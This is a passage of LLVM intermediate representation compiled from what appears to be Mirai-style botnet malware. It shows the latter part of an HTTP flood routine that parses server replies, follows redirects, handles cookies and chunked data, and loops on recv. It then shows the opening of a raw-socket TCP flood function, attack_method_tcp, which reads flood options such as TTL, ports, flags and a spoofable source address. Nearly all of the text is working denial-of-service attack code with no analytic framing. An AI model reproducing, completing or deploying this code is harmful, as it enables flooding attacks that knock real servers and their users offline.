  %730 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %730, i32 255) #7
  %731 = load i32, i32* %5, align 4
  %732 = add nsw i32 %731, 1
  %733 = sext i32 %732 to i64
  %734 = getelementptr inbounds i8, i8* %668, i64 %733
  %735 = call i32 @util_strlen(i8* %734) #7
  %736 = icmp sgt i32 %735, 0
  br i1 %736, label %737, label %750

; <label>:737:                                    ; preds = %729
  %738 = load i32, i32* %5, align 4
  %739 = add nsw i32 %738, 1
  %740 = sext i32 %739 to i64
  %741 = getelementptr inbounds i8, i8* %668, i64 %740
  %742 = call i32 @util_strlen(i8* %741) #7
  %743 = icmp slt i32 %742, 256
  br i1 %743, label %744, label %750

; <label>:744:                                    ; preds = %737
  %745 = load i32, i32* %5, align 4
  %746 = add nsw i32 %745, 1
  %747 = sext i32 %746 to i64
  %748 = getelementptr inbounds i8, i8* %668, i64 %747
  %749 = call i32 @util_strcpy(i8* %730, i8* %748) #7
  br label %750

; <label>:750:                                    ; preds = %726, %744, %737, %729, %705, %720, %712
  store i8 1, i8* %456, align 4
  br label %.loopexit591

; <label>:751:                                    ; preds = %659, %.critedge561
  %752 = call i8* @table_retrieve_val(i32 53, i32* null) #7
  %753 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %752) #7
  %754 = icmp eq i32 %753, -1
  br i1 %754, label %917, label %755

; <label>:755:                                    ; preds = %751
  %756 = call i8* @table_retrieve_val(i32 53, i32* null) #7
  %757 = call i32 @util_stristr(i8* nonnull %21, i32 %470, i8* %756) #7
  %758 = sext i32 %757 to i64
  %759 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %758
  %760 = load i8, i8* %759, align 1
  %761 = icmp eq i8 %760, 32
  %762 = zext i1 %761 to i32
  %.568 = add nsw i32 %762, %757
  %763 = sext i32 %.568 to i64
  %764 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %763
  %765 = sub nsw i32 %470, %.568
  %766 = call i32 @util_memsearch(i8* %764, i32 %765, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %767 = icmp eq i32 %766, -1
  br i1 %767, label %917, label %768

; <label>:768:                                    ; preds = %755
  %769 = icmp sgt i32 %766, 1
  %770 = add nsw i32 %766, -2
  %.569 = select i1 %769, i32 %770, i32 %766
  %771 = add nsw i32 %.568, %.569
  %772 = sext i32 %771 to i64
  %773 = getelementptr inbounds [10241 x i8], [10241 x i8]* %6, i64 0, i64 %772
  store i8 0, i8* %773, align 1
  br label %774

; <label>:774:                                    ; preds = %774, %768
  %indvars.iv655 = phi i64 [ %indvars.iv.next656, %774 ], [ 0, %768 ]
  %775 = getelementptr inbounds i8, i8* %764, i64 %indvars.iv655
  %776 = load i8, i8* %775, align 1
  %.off585 = add i8 %776, -48
  %777 = icmp ult i8 %.off585, 10
  %indvars.iv.next656 = add nuw i64 %indvars.iv655, 1
  br i1 %777, label %774, label %.critedge

.critedge:                                        ; preds = %774
  %778 = add nsw i32 %.569, 1
  %779 = trunc i64 %indvars.iv655 to i32
  store i32 %779, i32* %5, align 4
  %780 = icmp eq i8 %776, 0
  br i1 %780, label %917, label %781

; <label>:781:                                    ; preds = %.critedge
  store i8 0, i8* %775, align 1
  %782 = load i32, i32* %5, align 4
  %783 = add nsw i32 %782, 1
  store i32 %783, i32* %5, align 4
  %784 = sext i32 %783 to i64
  %785 = getelementptr inbounds i8, i8* %764, i64 %784
  %786 = load i8, i8* %785, align 1
  %787 = icmp eq i8 %786, 32
  br i1 %787, label %788, label %790

; <label>:788:                                    ; preds = %781
  %789 = add nsw i32 %782, 2
  store i32 %789, i32* %5, align 4
  br label %790

; <label>:790:                                    ; preds = %788, %781
  %791 = load i32, i32* %5, align 4
  %792 = sext i32 %791 to i64
  %793 = getelementptr inbounds i8, i8* %764, i64 %792
  %794 = call i32 @util_strlen(i8* %793) #7
  %795 = call i32 @util_stristr(i8* %793, i32 %794, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #7
  %796 = icmp eq i32 %795, -1
  br i1 %796, label %805, label %797

; <label>:797:                                    ; preds = %790
  %798 = load i32, i32* %5, align 4
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds i8, i8* %764, i64 %799
  %801 = call i32 @util_strlen(i8* %800) #7
  %802 = call i32 @util_stristr(i8* %800, i32 %801, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.11, i64 0, i64 0)) #7
  %803 = load i32, i32* %5, align 4
  %804 = add nsw i32 %803, %802
  store i32 %804, i32* %5, align 4
  br label %805

; <label>:805:                                    ; preds = %790, %797
  %806 = load i32, i32* %5, align 4
  %807 = sext i32 %806 to i64
  %808 = getelementptr inbounds i8, i8* %764, i64 %807
  %809 = load i8, i8* %808, align 1
  %810 = icmp eq i8 %809, 34
  br i1 %810, label %811, label %829

; <label>:811:                                    ; preds = %805
  %812 = add nsw i32 %806, 1
  store i32 %812, i32* %5, align 4
  %813 = sext i32 %812 to i64
  %814 = getelementptr inbounds i8, i8* %764, i64 %813
  %815 = call i32 @util_strlen(i8* %814) #7
  %816 = add nsw i32 %815, -1
  %817 = sext i32 %816 to i64
  %818 = getelementptr inbounds i8, i8* %814, i64 %817
  %819 = load i8, i8* %818, align 1
  %820 = icmp eq i8 %819, 34
  br i1 %820, label %821, label %829

; <label>:821:                                    ; preds = %811
  %822 = load i32, i32* %5, align 4
  %823 = sext i32 %822 to i64
  %824 = getelementptr inbounds i8, i8* %764, i64 %823
  %825 = call i32 @util_strlen(i8* %824) #7
  %826 = add nsw i32 %825, -1
  %827 = sext i32 %826 to i64
  %828 = getelementptr inbounds i8, i8* %824, i64 %827
  store i8 0, i8* %828, align 1
  br label %829

; <label>:829:                                    ; preds = %811, %821, %805
  %830 = call i32 @util_atoi(i8* nonnull %764, i32 10) #7
  %831 = add i32 %830, %417
  %832 = zext i32 %831 to i64
  %.off = add i32 %830, -1
  %833 = icmp ult i32 %.off, 9
  br i1 %833, label %.lr.ph629.preheader, label %.critedge12

.lr.ph629.preheader:                              ; preds = %829
  %834 = call i64 @time(i64* null) #7
  %835 = icmp sgt i64 %832, %834
  br i1 %835, label %.lr.ph629.preheader698, label %.critedge12

.lr.ph629.preheader698:                           ; preds = %.lr.ph629.preheader
  br label %.lr.ph629

.lr.ph629:                                        ; preds = %.lr.ph629.preheader698, %.lr.ph629
  %836 = call i32 @sleep(i32 1) #7
  %837 = call i64 @time(i64* null) #7
  %838 = icmp sgt i64 %832, %837
  br i1 %838, label %.lr.ph629, label %.critedge12.loopexit

.critedge12.loopexit:                             ; preds = %.lr.ph629
  br label %.critedge12

.critedge12:                                      ; preds = %.critedge12.loopexit, %.lr.ph629.preheader, %829
  %839 = load i32, i32* %5, align 4
  %840 = sext i32 %839 to i64
  %841 = getelementptr inbounds i8, i8* %764, i64 %840
  %842 = call i32 @util_strlen(i8* %841) #7
  %843 = call i32 @util_stristr(i8* %841, i32 %842, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.10, i64 0, i64 0)) #7
  %844 = icmp eq i32 %843, 4
  br i1 %844, label %845, label %890

; <label>:845:                                    ; preds = %.critedge12
  %846 = getelementptr inbounds i8, i8* %841, i64 4
  %847 = load i8, i8* %846, align 1
  %848 = icmp eq i8 %847, 115
  %.572 = select i1 %848, i32 8, i32 7
  store i32 %.572, i32* %5, align 4
  %849 = zext i32 %.572 to i64
  %850 = getelementptr inbounds i8, i8* %841, i64 %849
  %851 = sub i32 %778, %.572
  %852 = sext i32 %851 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %841, i8* %850, i64 %852, i32 1, i1 false)
  br label %853

; <label>:853:                                    ; preds = %858, %845
  %indvars.iv657 = phi i64 [ %indvars.iv.next658, %858 ], [ 0, %845 ]
  %854 = getelementptr inbounds i8, i8* %841, i64 %indvars.iv657
  %855 = load i8, i8* %854, align 1
  switch i8 %855, label %858 [
    i8 0, label %.loopexit587
    i8 47, label %856
  ]

; <label>:856:                                    ; preds = %853
  %857 = trunc i64 %indvars.iv657 to i32
  store i32 %857, i32* %5, align 4
  store i8 0, i8* %854, align 1
  br label %860

; <label>:858:                                    ; preds = %853
  %indvars.iv.next658 = add nuw i64 %indvars.iv657, 1
  br label %853

.loopexit587:                                     ; preds = %853
  %859 = trunc i64 %indvars.iv657 to i32
  store i32 %859, i32* %5, align 4
  br label %860

; <label>:860:                                    ; preds = %.loopexit587, %856
  %861 = call i32 @util_strlen(i8* nonnull %841) #7
  %862 = icmp sgt i32 %861, 0
  br i1 %862, label %863, label %869

; <label>:863:                                    ; preds = %860
  %864 = call i32 @util_strlen(i8* nonnull %841) #7
  %865 = icmp slt i32 %864, 128
  br i1 %865, label %866, label %869

; <label>:866:                                    ; preds = %863
  %867 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 7, i64 0
  %868 = call i32 @util_strcpy(i8* %867, i8* nonnull %841) #7
  br label %869

; <label>:869:                                    ; preds = %866, %863, %860
  %870 = load i32, i32* %5, align 4
  %871 = add nsw i32 %870, 1
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds i8, i8* %841, i64 %872
  %874 = call i32 @util_strlen(i8* %873) #7
  %875 = icmp slt i32 %874, 256
  br i1 %875, label %876, label %914

; <label>:876:                                    ; preds = %869
  %877 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %877, i32 255) #7
  %878 = load i32, i32* %5, align 4
  %879 = add nsw i32 %878, 1
  %880 = sext i32 %879 to i64
  %881 = getelementptr inbounds i8, i8* %841, i64 %880
  %882 = call i32 @util_strlen(i8* %881) #7
  %883 = icmp sgt i32 %882, 0
  br i1 %883, label %884, label %914

; <label>:884:                                    ; preds = %876
  %885 = load i32, i32* %5, align 4
  %886 = add nsw i32 %885, 1
  %887 = sext i32 %886 to i64
  %888 = getelementptr inbounds i8, i8* %841, i64 %887
  %889 = call i32 @util_strcpy(i8* %877, i8* %888) #7
  br label %914

; <label>:890:                                    ; preds = %.critedge12
  %891 = load i8, i8* %841, align 1
  %892 = icmp eq i8 %891, 47
  br i1 %892, label %893, label %914

; <label>:893:                                    ; preds = %890
  %894 = load i32, i32* %5, align 4
  %895 = add nsw i32 %894, 1
  %896 = sext i32 %895 to i64
  %897 = getelementptr inbounds i8, i8* %841, i64 %896
  %898 = call i32 @util_strlen(i8* %897) #7
  %899 = icmp slt i32 %898, 256
  br i1 %899, label %900, label %914

; <label>:900:                                    ; preds = %893
  %901 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 6, i64 1
  call void @util_zero(i8* %901, i32 255) #7
  %902 = load i32, i32* %5, align 4
  %903 = add nsw i32 %902, 1
  %904 = sext i32 %903 to i64
  %905 = getelementptr inbounds i8, i8* %841, i64 %904
  %906 = call i32 @util_strlen(i8* %905) #7
  %907 = icmp sgt i32 %906, 0
  br i1 %907, label %908, label %914

; <label>:908:                                    ; preds = %900
  %909 = load i32, i32* %5, align 4
  %910 = add nsw i32 %909, 1
  %911 = sext i32 %910 to i64
  %912 = getelementptr inbounds i8, i8* %841, i64 %911
  %913 = call i32 @util_strcpy(i8* %901, i8* %912) #7
  br label %914

; <label>:914:                                    ; preds = %890, %900, %908, %893, %869, %884, %876
  %915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 9, i64 0
  %916 = bitcast i8* %915 to i32*
  store i32 5522759, i32* %916, align 1
  store i8 10, i8* %456, align 4
  br label %.loopexit591

; <label>:917:                                    ; preds = %.critedge, %755, %751
  %918 = call i32 @util_memsearch(i8* nonnull %21, i32 %470, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i32 4) #7
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 9, i64 0
  %920 = call signext i8 @util_strcmp(i8* %919, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i64 0, i64 0)) #7
  %921 = icmp eq i8 %920, 0
  br i1 %921, label %922, label %927

; <label>:922:                                    ; preds = %917
  %923 = call signext i8 @util_strcmp(i8* %919, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0)) #7
  %924 = icmp eq i8 %923, 0
  br i1 %924, label %925, label %927

; <label>:925:                                    ; preds = %922
  %926 = icmp sgt i32 %470, %918
  %.sink13 = select i1 %926, i8 10, i8 1
  br label %927

; <label>:927:                                    ; preds = %917, %922, %925
  %storemerge542 = phi i8 [ %.sink13, %925 ], [ 7, %922 ], [ 7, %917 ]
  store i8 %storemerge542, i8* %456, align 4
  %928 = load i32, i32* %419, align 4
  %929 = sext i32 %918 to i64
  %930 = call i64 @recv(i32 %928, i8* nonnull %21, i64 %929, i32 16384) #7
  br label %.loopexit591

; <label>:931:                                    ; preds = %.preheader590, %.backedge
  %932 = load i32, i32* %458, align 4
  %933 = icmp eq i32 %932, 1024
  br i1 %933, label %934, label %937

; <label>:934:                                    ; preds = %931
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %459, i8* nonnull %460, i64 960, i32 1, i1 false)
  %935 = load i32, i32* %458, align 4
  %936 = add nsw i32 %935, -64
  store i32 %936, i32* %458, align 4
  br label %937

; <label>:937:                                    ; preds = %934, %931
  %938 = tail call i32* @__errno_location() #8
  store i32 0, i32* %938, align 4
  %939 = load i32, i32* %419, align 4
  %940 = load i32, i32* %458, align 4
  %941 = sext i32 %940 to i64
  %942 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %941
  %943 = sub nsw i32 1024, %940
  %944 = sext i32 %943 to i64
  %945 = call i64 @recv(i32 %939, i8* %942, i64 %944, i32 16384) #7
  %946 = trunc i64 %945 to i32
  switch i32 %946, label %952 [
    i32 0, label %.thread581
    i32 -1, label %947
  ]

.thread581:                                       ; preds = %937
  store i32 104, i32* %938, align 4
  br label %949

; <label>:947:                                    ; preds = %937
  %.pr580 = load i32, i32* %938, align 4
  %948 = icmp eq i32 %.pr580, 11
  br i1 %948, label %.loopexit591, label %949

; <label>:949:                                    ; preds = %.thread581, %947
  %950 = load i32, i32* %419, align 4
  %951 = call i32 @close(i32 %950) #7
  store i32 -1, i32* %419, align 4
  store i8 0, i8* %456, align 4
  br label %.loopexit591

; <label>:952:                                    ; preds = %937
  %953 = load i32, i32* %458, align 4
  %954 = add nsw i32 %953, %946
  store i32 %954, i32* %458, align 4
  store i32 %417, i32* %462, align 4
  br label %955

; <label>:955:                                    ; preds = %1056, %952
  %956 = load i32, i32* %463, align 4
  %957 = icmp sgt i32 %956, 0
  br i1 %957, label %958, label %1021

; <label>:958:                                    ; preds = %955
  %959 = load i32, i32* %458, align 4
  %960 = icmp sgt i32 %956, %959
  %.sink14 = select i1 %960, i32* %458, i32* %463
  %961 = load i32, i32* %.sink14, align 4
  %962 = sub nsw i32 %956, %961
  store i32 %962, i32* %463, align 4
  %963 = load i32, i32* %464, align 4
  %964 = icmp eq i32 %963, 1
  br i1 %964, label %965, label %1021

; <label>:965:                                    ; preds = %958
  %966 = load i32, i32* %458, align 4
  %967 = call i8* @table_retrieve_val(i32 52, i32* null) #7
  %968 = call i32 @util_memsearch(i8* nonnull %461, i32 %966, i8* %967, i32 11) #7
  %969 = icmp eq i32 %968, -1
  br i1 %969, label %thread-pre-split573, label %970

; <label>:970:                                    ; preds = %965
  %971 = load i32, i32* %458, align 4
  %972 = call i8* @table_retrieve_val(i32 52, i32* null) #7
  %973 = call i32 @util_memsearch(i8* nonnull %461, i32 %971, i8* %972, i32 11) #7
  %974 = sext i32 %973 to i64
  %975 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %974
  %976 = load i32, i32* %458, align 4
  %977 = sub nsw i32 %976, %973
  %978 = call i32 @util_memsearch(i8* %975, i32 %977, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1) #7
  %979 = add i32 %973, -1
  %980 = add i32 %979, %978
  %981 = sext i32 %980 to i64
  %982 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %981
  store i8 0, i8* %982, align 1
  %983 = load i32, i32* %466, align 4
  %984 = icmp slt i32 %983, 5
  br i1 %984, label %985, label %1020

; <label>:985:                                    ; preds = %970
  %986 = call i32 @util_strlen(i8* %975) #7
  %987 = icmp slt i32 %986, 128
  br i1 %987, label %988, label %1020

; <label>:988:                                    ; preds = %985
  %989 = load i32, i32* %466, align 4
  %990 = sext i32 %989 to i64
  %991 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %990, i64 0
  %992 = call i32 @util_strcpy(i8* %991, i8* %975) #7
  %993 = load i32, i32* %466, align 4
  %994 = sext i32 %993 to i64
  %995 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %994, i64 0
  %996 = call i32 @util_strlen(i8* %995) #7
  %997 = sext i32 %996 to i64
  %998 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %994, i64 %997
  %999 = call i32 @util_strcpy(i8* %998, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i64 0, i64 0)) #7
  %1000 = add i32 %973, 3
  %1001 = add i32 %1000, %978
  %1002 = sext i32 %1001 to i64
  %1003 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1002
  %1004 = load i32, i32* %458, align 4
  %1005 = sub nsw i32 %1004, %1001
  %1006 = call i32 @util_memsearch(i8* %1003, i32 %1005, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i64 0, i64 0), i32 1) #7
  %1007 = add i32 %1001, -1
  %1008 = add i32 %1007, %1006
  %1009 = sext i32 %1008 to i64
  %1010 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1009
  store i8 0, i8* %1010, align 1
  %1011 = load i32, i32* %466, align 4
  %1012 = sext i32 %1011 to i64
  %1013 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %1012, i64 0
  %1014 = call i32 @util_strlen(i8* %1013) #7
  %1015 = sext i32 %1014 to i64
  %1016 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 16, i64 %1012, i64 %1015
  %1017 = call i32 @util_strcpy(i8* %1016, i8* %1003) #7
  %1018 = load i32, i32* %466, align 4
  %1019 = add nsw i32 %1018, 1
  store i32 %1019, i32* %466, align 4
  br label %1020

; <label>:1020:                                   ; preds = %988, %985, %970
  store i32 -1, i32* %463, align 4
  store i8 10, i8* %456, align 4
  br label %.loopexit591

thread-pre-split573:                              ; preds = %965
  %.pr574 = load i32, i32* %463, align 4
  br label %1021

; <label>:1021:                                   ; preds = %thread-pre-split573, %958, %955
  %1022 = phi i32 [ %.pr574, %thread-pre-split573 ], [ %962, %958 ], [ %956, %955 ]
  %.0522 = phi i32 [ %961, %thread-pre-split573 ], [ %961, %958 ], [ 0, %955 ]
  %1023 = icmp eq i32 %1022, 0
  br i1 %1023, label %1024, label %1054

; <label>:1024:                                   ; preds = %1021
  %1025 = load i32, i32* %465, align 4
  %1026 = icmp eq i32 %1025, 1
  %1027 = load i32, i32* %458, align 4
  br i1 %1026, label %1028, label %1049

; <label>:1028:                                   ; preds = %1024
  %1029 = call i32 @util_memsearch(i8* nonnull %461, i32 %1027, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %1030 = icmp eq i32 %1029, -1
  br i1 %1030, label %1054, label %1031

; <label>:1031:                                   ; preds = %1028
  %1032 = load i32, i32* %458, align 4
  %1033 = call i32 @util_memsearch(i8* nonnull %461, i32 %1032, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 2) #7
  %1034 = add nsw i32 %1033, -2
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1035
  store i8 0, i8* %1036, align 1
  %1037 = call i32 @util_memsearch(i8* nonnull %461, i32 %1033, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1) #7
  %1038 = icmp eq i32 %1037, -1
  br i1 %1038, label %1043, label %1039

; <label>:1039:                                   ; preds = %1031
  %1040 = call i32 @util_memsearch(i8* nonnull %461, i32 %1033, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i64 0, i64 0), i32 1) #7
  %1041 = sext i32 %1040 to i64
  %1042 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1041
  store i8 0, i8* %1042, align 1
  br label %1043

; <label>:1043:                                   ; preds = %1031, %1039
  %1044 = call i32 @util_atoi(i8* nonnull %461, i32 16) #7
  %1045 = icmp eq i32 %1044, 0
  br i1 %1045, label %1046, label %1047

; <label>:1046:                                   ; preds = %1043
  store i8 1, i8* %456, align 4
  br label %.loopexit591

; <label>:1047:                                   ; preds = %1043
  %1048 = add nsw i32 %1044, 2
  store i32 %1048, i32* %463, align 4
  br label %1054

; <label>:1049:                                   ; preds = %1024
  %1050 = sub nsw i32 %1027, %.0522
  store i32 %1050, i32* %463, align 4
  %1051 = icmp eq i32 %1050, 0
  br i1 %1051, label %1052, label %1054

; <label>:1052:                                   ; preds = %1049
  store i8 1, i8* %456, align 4
  br label %.loopexit591

.backedge:                                        ; preds = %1054, %1056
  %.pr = load i8, i8* %456, align 4
  %1053 = icmp eq i8 %.pr, 7
  br i1 %1053, label %931, label %.loopexit591.loopexit

; <label>:1054:                                   ; preds = %1028, %1047, %1049, %1021
  %.1523 = phi i32 [ %1033, %1047 ], [ %.0522, %1028 ], [ %.0522, %1049 ], [ %.0522, %1021 ]
  %1055 = icmp eq i32 %.1523, 0
  br i1 %1055, label %.backedge, label %1056

; <label>:1056:                                   ; preds = %1054
  %1057 = load i32, i32* %458, align 4
  %1058 = sub nsw i32 %1057, %.1523
  store i32 %1058, i32* %458, align 4
  %1059 = sext i32 %.1523 to i64
  %1060 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1059
  %1061 = sext i32 %1058 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %461, i8* %1060, i64 %1061, i32 1, i1 false)
  %1062 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %50, i64 %indvars.iv659, i32 18, i64 %1061
  store i8 0, i8* %1062, align 1
  %1063 = load i32, i32* %458, align 4
  %1064 = icmp eq i32 %1063, 0
  br i1 %1064, label %.backedge, label %955

.preheader592:                                    ; preds = %.preheader592.preheader, %.preheader592
  %1065 = tail call i32* @__errno_location() #8
  store i32 0, i32* %1065, align 4
  %1066 = load i32, i32* %419, align 4
  %1067 = call i64 @recv(i32 %1066, i8* nonnull %21, i64 10240, i32 16384) #7
  %1068 = trunc i64 %1067 to i32
  switch i32 %1068, label %.preheader592 [
    i32 0, label %.thread584
    i32 -1, label %1069
  ]

.thread584:                                       ; preds = %.preheader592
  store i32 104, i32* %1065, align 4
  br label %.thread578

; <label>:1069:                                   ; preds = %.preheader592
  %.pr583 = load i32, i32* %1065, align 4
  %1070 = icmp eq i32 %.pr583, 11
  br i1 %1070, label %1073, label %.thread578

.thread578:                                       ; preds = %1069, %.thread584
  %1071 = load i32, i32* %419, align 4
  %1072 = call i32 @close(i32 %1071) #7
  store i32 -1, i32* %419, align 4
  store i8 0, i8* %456, align 4
  br label %.loopexit591

; <label>:1073:                                   ; preds = %1069
  %.pr577 = load i8, i8* %456, align 4
  %1074 = icmp eq i8 %.pr577, 0
  br i1 %1074, label %.loopexit591, label %1075

; <label>:1075:                                   ; preds = %1073
  store i8 1, i8* %456, align 4
  br label %.loopexit591

.loopexit591.loopexit:                            ; preds = %.backedge
  br label %.loopexit591

.loopexit591:                                     ; preds = %.loopexit591.loopexit, %1052, %1046, %1020, %.thread578, %455, %947, %1073, %444, %949, %1075, %927, %475, %.lr.ph633, %914, %750, %472, %440
  %indvars.iv.next660 = add nuw nsw i64 %indvars.iv659, 1
  %1076 = icmp slt i64 %indvars.iv.next660, %70
  br i1 %1076, label %.lr.ph633, label %.backedge596.loopexit

; <label>:1077:                                   ; preds = %30, %27, %24, %4
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

declare i32 @util_strlen(i8*) local_unnamed_addr #3

declare void @table_unlock_val(i8 zeroext) local_unnamed_addr #3

declare i32 @util_strcpy(i8*, i8*) local_unnamed_addr #3

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

declare i32 @rand_next() local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

declare i8* @table_retrieve_val(i32, i32*) local_unnamed_addr #3

declare void @table_lock_val(i8 zeroext) local_unnamed_addr #3

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare void @util_zero(i8*, i32) local_unnamed_addr #3

declare i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strcmp(i8*, i8*) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #3

declare i32 @util_memsearch(i8*, i32, i8*, i32) local_unnamed_addr #3

declare i32 @util_stristr(i8*, i32, i8*) local_unnamed_addr #3

declare signext i8 @util_strncmp(i8*, i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcp(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %227, label %39

; <label>:39:                                     ; preds = %4
